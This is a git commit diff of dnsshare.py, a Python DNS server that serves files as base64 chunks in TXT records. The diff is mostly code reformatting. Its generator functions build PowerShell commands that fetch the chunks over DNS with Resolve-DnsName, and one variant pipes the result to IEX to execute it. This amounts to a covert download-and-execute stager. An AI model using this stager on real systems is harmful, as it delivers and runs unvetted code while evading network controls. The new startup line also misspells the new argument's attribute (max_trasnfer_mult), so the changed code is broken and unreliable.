82a6f2f76ad1b86669e36e9002fbf80e16b636ef
Veids <veidsme@gmail.com>
2024-08-06 14:45:13 +0300

    bump

--- dnsshare.py
+++ dnsshare.py
@@ -2,22 +2,25 @@
 
 from __future__ import print_function
 
-import binascii,socket,struct,os,re,hashlib
+import argparse, time
+import os, re, hashlib
+
 from base64 import b64encode
 
-from dnslib import DNSRecord,RCODE,QTYPE,RR,TXT
-from dnslib.server import DNSServer,DNSHandler,BaseResolver,DNSLogger
+from dnslib import RCODE, QTYPE, RR, TXT
+from dnslib.server import DNSServer, DNSHandler, BaseResolver, DNSLogger
 import cachetools.func
 
 MAX_TXT_SIZE = 250
 MAX_TRANSFER_SIZE = MAX_TXT_SIZE
+
 
 class ShareDNS(BaseResolver):
     def __init__(self, domain, files_path):
         self.domain = domain
         self.files_path = files_path
 
-    def resolve(self,request,handler):
+    def resolve(self, request, _):
         if request.q.qname.matchSuffix(self.domain):
             reply = request.reply()
             if request.q.qtype == QTYPE.TXT:
@@ -26,7 +29,9 @@ class ShareDNS(BaseResolver):
                 if qname.matchSuffix("ls"):
                     # Directory listing
                     content = self.ls()
-                    reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=60, rdata=TXT(content)))
+                    reply.add_answer(
+                        RR(request.q.qname, QTYPE.TXT, ttl=60, rdata=TXT(content))
+                    )
                 elif qname.matchSuffix("f") or qname.matchSuffix("c"):
                     # Serve files or commands
                     command = False
@@ -47,14 +52,23 @@ class ShareDNS(BaseResolver):
                             chunks = self.get_file_chunks(fname)
                             if chunk_idx < len(chunks):
                                 chunk = chunks[chunk_idx]
-                                reply.add_answer(RR(
-                                    request.q.qname,
-                                    QTYPE.TXT,
-                                    ttl=60,
-                                    rdata=TXT([ chunk[i:i + MAX_TXT_SIZE] for i in range(0, len(chunk), MAX_TXT_SIZE)])
-                                ))
+                                reply.add_answer(
+                                    RR(
+                                        request.q.qname,
+                                        QTYPE.TXT,
+                                        ttl=60,
+                                        rdata=TXT(
+                                            [
+                                                chunk[i : i + MAX_TXT_SIZE]
+                                                for i in range(
+                                                    0, len(chunk), MAX_TXT_SIZE
+                                                )
+                                            ]
+                                        ),
+                                    )
+                                )
                         else:
-                            reply.header.rcode = getattr(RCODE,'NXDOMAIN')
+                            reply.header.rcode = getattr(RCODE, "NXDOMAIN")
                     else:
                         # Serve file info (size, cmds)
                         content = self.ls()
@@ -66,12 +80,19 @@ class ShareDNS(BaseResolver):
                             else:
                                 cmd = self.gen_download_cmd(fname, n_chunks)
                             hash = self.get_file_hash(fname)
-                            reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=60, rdata=TXT([hash,cmd,str(n_chunks)])))
+                            reply.add_answer(
+                                RR(
+                                    request.q.qname,
+                                    QTYPE.TXT,
+                                    ttl=60,
+                                    rdata=TXT([hash, cmd, str(n_chunks)]),
+                                )
+                            )
                         else:
-                            reply.header.rcode = getattr(RCODE,'NXDOMAIN')
+                            reply.header.rcode = getattr(RCODE, "NXDOMAIN")
         else:
             reply = request.reply()
-            reply.header.rcode = getattr(RCODE,'NXDOMAIN')
+            reply.header.rcode = getattr(RCODE, "NXDOMAIN")
 
         return reply
 
@@ -83,59 +104,111 @@ class ShareDNS(BaseResolver):
     def get_file_chunks(self, fname):
         f = open(os.path.join(self.files_path, fname), "rb").read()
         f = b64encode(f)
-        return [f[i:i + MAX_TRANSFER_SIZE] for i in range(0, len(f), MAX_TRANSFER_SIZE)]
+        return [
+            f[i : i + MAX_TRANSFER_SIZE] for i in range(0, len(f), MAX_TRANSFER_SIZE)
+        ]
 
     def get_file_hash(self, fname):
         b = open(os.path.join(self.files_path, fname), "rb").read()
         return hashlib.sha256(b).hexdigest()
 
     def gen_download_cmd(self, fname, n_chunks):
-        return '$o="";0..' + str(n_chunks-1) + '|%{$p=$_;0..99|%{try{$r=(Resolve-DnsName "$p.'+ fname + '.f.' + self.domain + '" -Type TXT -ErrorAction Stop).Strings;return}catch{sleep 1}};$r.ForEach({$o+=$_})};$res=[Convert]::FromBase64String($o)'
+        return (
+            '$o="";0..'
+            + str(n_chunks - 1)
+            + '|%{$p=$_;0..99|%{try{$r=(Resolve-DnsName "$p.'
+            + fname
+            + ".f."
+            + self.domain
+            + '" -Type TXT -ErrorAction Stop).Strings;return}catch{sleep 1}};$r.ForEach({$o+=$_})};$res=[Convert]::FromBase64String($o)'
+        )
 
     def gen_download_invoke_cmd(self, fname, n_chunks):
-        return self.gen_download_cmd(fname, n_chunks) + ';[Text.Encoding]::Utf8.GetString($o)|IEX'
+        return (
+            self.gen_download_cmd(fname, n_chunks)
+            + ";[Text.Encoding]::Utf8.GetString($o)|IEX"
+        )
 
-if __name__ == '__main__':
-    import argparse,sys,time
 
+if __name__ == "__main__":
     p = argparse.ArgumentParser(description="DNS share")
-    p.add_argument("--port","-p",type=int,default=53,
-                    metavar="<port>",
-                    help="Local proxy port (default:53)")
-    p.add_argument("--address","-a",default="",
-                    metavar="<address>",
-                    help="Local proxy listen address (default:all)")
-    p.add_argument("--domain","-d",default="",
-                    metavar="<domain>",
-                    help="DNS server domain name (ex. momba.kz)",
-                    required = True)
-    p.add_argument("--tcp",action='store_true',default=False,
-                    help="TCP proxy (default: UDP only)")
-    p.add_argument("--log",default="request,reply,truncated,error",
-                    help="Log hooks to enable (default: +request,+reply,+truncated,+error,-recv,-send,-data)")
-    p.add_argument("--log-prefix",action='store_true',default=False,
-                    help="Log prefix (timestamp/handler/resolver) (default: False)")
-    p.add_argument("--files-path", "-f", required = True, help = "Files directory")
+    p.add_argument(
+        "--port",
+        "-p",
+        type=int,
+        default=53,
+        metavar="<port>",
+        help="Local proxy port (default:53)",
+    )
+    p.add_argument(
+        "--address",
+        "-a",
+        default="",
+        metavar="<address>",
+        help="Local proxy listen address (default:all)",
+    )
+    p.add_argument(
+        "--domain",
+        "-d",
+        default="",
+        metavar="<domain>",
+        help="DNS server domain name (ex. momba.kz)",
+        required=True,
+    )
+    p.add_argument(
+        "--tcp",
+        action="store_true",
+        default=False,
+        help="TCP proxy (default: UDP only)",
+    )
+    p.add_argument(
+        "--log",
+        default="request,reply,truncated,error",
+        help="Log hooks to enable (default: +request,+reply,+truncated,+error,-recv,-send,-data)",
+    )
+    p.add_argument(
+        "--log-prefix",
+        action="store_true",
+        default=False,
+        help="Log prefix (timestamp/handler/resolver) (default: False)",
+    )
+    p.add_argument("--files-path", "-f", required=True, help="Files directory")
+    p.add_argument(
+        "--max-transfer-mult",
+        default=1,
+        help="Maximum transfer size multiplier 250 * <mult>",
+    )
     args = p.parse_args()
 
-    print("[I] Starting DNS share (%s) (%s:%d) [%s]" % (args.domain, args.address or "*", args.port, "UDP/TCP" if args.tcp else "UDP"))
+    MAX_TRANSFER_SIZE = MAX_TRANSFER_SIZE * args.max_trasnfer_mult
+
+    print(
+        "[I] Starting DNS share (%s) (%s:%d) [%s]"
+        % (
+            args.domain,
+            args.address or "*",
+            args.port,
+            "UDP/TCP" if args.tcp else "UDP",
+        )
+    )
 
     resolver = ShareDNS(args.domain, args.files_path)
     handler = DNSHandler
-    logger = DNSLogger(args.log,prefix=args.log_prefix)
-    udp_server = DNSServer(resolver,
-                           port=args.port,
-                           address=args.address,
-                           handler=handler)
+    logger = DNSLogger(args.log, prefix=args.log_prefix)
+    udp_server = DNSServer(
+        resolver, port=args.port, address=args.address, handler=handler
+    )
     udp_server.start_thread()
 
     if args.tcp:
-        tcp_server = DNSServer(resolver,
-                               port=args.port,
-                               address=args.address,
-                               tcp=True,
-                               logger=logger,
-                               handler=handler)
+        tcp_server = DNSServer(
+            resolver,
+            port=args.port,
+            address=args.address,
+            tcp=True,
+            logger=logger,
+            handler=handler,
+        )
         tcp_server.start_thread()
 
     while udp_server.isAlive():
